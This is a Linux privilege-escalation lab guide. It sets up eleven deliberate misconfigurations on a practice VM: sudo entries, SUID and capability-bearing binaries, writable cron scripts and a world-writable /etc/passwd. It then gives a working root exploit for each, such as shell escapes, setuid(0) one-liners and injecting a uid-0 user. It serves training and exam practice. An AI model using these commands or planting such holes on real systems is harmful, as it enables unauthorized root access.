# Lab: Linux Privilege Escalation Playground

## Objective

Set up MULTIPLE privilege escalation vectors on a single machine. Practice identifying and exploiting each one independently. This is the most efficient way to build privesc muscle memory — you don't need to set up a new machine for each technique.

## What You'll Practice

- sudo misconfigurations (4 different vectors)
- SUID binaries (3 different vectors)
- Writable cron jobs
- PATH manipulation
- Writable /etc/passwd
- Linux capabilities
- Kernel version identification

---

## Setup (on your Debian or Ubuntu VM)

### Create the practice user

```bash
sudo useradd -m -s /bin/bash student
echo "student:student" | sudo chpasswd
```

### Vector 1: sudo — vim (shell escape)

```bash
echo "student ALL=(root) NOPASSWD: /usr/bin/vim" | sudo tee /etc/sudoers.d/01-vim
```

### Vector 2: sudo — find (command execution)

```bash
echo "student ALL=(root) NOPASSWD: /usr/bin/find" | sudo tee /etc/sudoers.d/02-find
```

### Vector 3: sudo — python3 (code execution)

```bash
echo "student ALL=(root) NOPASSWD: /usr/bin/python3" | sudo tee /etc/sudoers.d/03-python
```

### Vector 4: sudo — env (environment escape)

```bash
echo "student ALL=(root) NOPASSWD: /usr/bin/env" | sudo tee /etc/sudoers.d/04-env
```

### Vector 5: SUID — find

```bash
sudo cp /usr/bin/find /usr/local/bin/find_suid
sudo chmod u+s /usr/local/bin/find_suid
```

### Vector 6: SUID — python3

```bash
sudo cp /usr/bin/python3 /usr/local/bin/python3_suid
sudo chmod u+s /usr/local/bin/python3_suid
```

### Vector 7: SUID — bash

```bash
sudo cp /usr/bin/bash /usr/local/bin/bash_suid
sudo chmod u+s /usr/local/bin/bash_suid
```

### Vector 8: Writable cron script

```bash
sudo mkdir -p /opt/scripts
echo '#!/bin/bash' | sudo tee /opt/scripts/backup.sh
echo 'echo "backup ran at $(date)" >> /tmp/backup.log' | sudo tee -a /opt/scripts/backup.sh
sudo chmod 777 /opt/scripts/backup.sh
echo "*/2 * * * * root /opt/scripts/backup.sh" | sudo tee /etc/cron.d/backup
```

### Vector 9: PATH manipulation with cron

```bash
# Create a cron job that calls a command without full path
echo '#!/bin/bash' | sudo tee /opt/scripts/cleanup.sh
echo 'status_check' | sudo tee -a /opt/scripts/cleanup.sh
sudo chmod 755 /opt/scripts/cleanup.sh
echo "*/2 * * * * root /opt/scripts/cleanup.sh" | sudo tee /etc/cron.d/cleanup
echo "PATH=/home/student:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin" | sudo tee -a /etc/crontab
```

### Vector 10: Writable /etc/passwd

```bash
# WARNING: This makes your system insecure. Only do this in a lab VM.
sudo chmod 666 /etc/passwd
```

### Vector 11: Capabilities on python3

```bash
sudo cp /usr/bin/python3 /usr/local/bin/python3_cap
sudo setcap cap_setuid+ep /usr/local/bin/python3_cap
```

### Create the flag

```bash
echo "FLAG{privesc_playground_complete}" | sudo tee /root/flag.txt
sudo chmod 600 /root/flag.txt
```

---

## Practice — Login as the student user

```bash
su - student
# Password: student
```

### Challenge 1: Enumerate everything

Before exploiting anything, run the full enumeration:

```bash
# Step 1: Who am I?
whoami && id

# Step 2: What can I sudo?
sudo -l

# Step 3: SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Step 4: Capabilities
getcap -r / 2>/dev/null

# Step 5: Cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/*

# Step 6: Writable files
ls -la /etc/passwd
ls -la /opt/scripts/*
find / -writable -type f 2>/dev/null | grep -v /proc | grep -v /sys | head -20

# Step 7: Kernel version (for reference)
uname -r
```

**Write down every finding before exploiting any of them.** This simulates the exam — enumerate first, exploit second.

### Challenge 2: Exploit each vector

**Exploit sudo vim:**
```bash
sudo vim -c ':!bash'
# In vim, :! runs an external command
# :!bash spawns a bash shell — as root because sudo
whoami    # root
cat /root/flag.txt
exit      # back to student
```

**Exploit sudo find:**
```bash
sudo find / -exec /bin/bash \; -quit
whoami    # root
exit
```

**Exploit sudo python3:**
```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
whoami    # root
exit
```

**Exploit sudo env:**
```bash
sudo env /bin/bash
whoami    # root
exit
```

**Exploit SUID find:**
```bash
/usr/local/bin/find_suid . -exec /bin/bash -p \;
whoami    # root (or euid=0)
exit
```

**Exploit SUID python3:**
```bash
/usr/local/bin/python3_suid -c 'import os; os.setuid(0); os.system("/bin/bash")'
whoami    # root
exit
```

**Exploit SUID bash:**
```bash
/usr/local/bin/bash_suid -p
whoami    # root
exit
```

**Exploit writable cron script:**
```bash
# Overwrite the backup script with a command that creates proof
echo '#!/bin/bash' > /opt/scripts/backup.sh
echo 'cp /root/flag.txt /tmp/flag_from_cron.txt' >> /opt/scripts/backup.sh
echo 'chmod 644 /tmp/flag_from_cron.txt' >> /opt/scripts/backup.sh
# Wait 2 minutes
cat /tmp/flag_from_cron.txt
```

**Exploit writable /etc/passwd:**
```bash
# Generate a password hash
openssl passwd -1 hacker
# Output: $1$xxxxxxxx$yyyyyyyyyyyyyyyyyyyy

# Add a root user
echo 'hacker:$1$xxxxxxxx$yyyyyyyyyyyyyyyyyyyy:0:0::/root:/bin/bash' >> /etc/passwd

# Switch to the new root user
su hacker
# Password: hacker
whoami    # root
exit
```

**Exploit capabilities (python3_cap):**
```bash
/usr/local/bin/python3_cap -c 'import os; os.setuid(0); os.system("/bin/bash")'
whoami    # root
exit
```

### Challenge 3: Time yourself

Reset your mental state and run through the enumeration + ONE exploitation as fast as possible. Target: under 5 minutes from "I have a shell" to "I'm root."

---

## Cleanup

```bash
# Remove everything
sudo userdel -r student
sudo rm /etc/sudoers.d/01-vim /etc/sudoers.d/02-find /etc/sudoers.d/03-python /etc/sudoers.d/04-env
sudo rm /usr/local/bin/find_suid /usr/local/bin/python3_suid /usr/local/bin/bash_suid /usr/local/bin/python3_cap
sudo rm /opt/scripts/backup.sh /opt/scripts/cleanup.sh
sudo rm /etc/cron.d/backup /etc/cron.d/cleanup
sudo chmod 644 /etc/passwd
sudo rm /root/flag.txt
# Remove the hacker user if you added one
sudo sed -i '/^hacker:/d' /etc/passwd
```
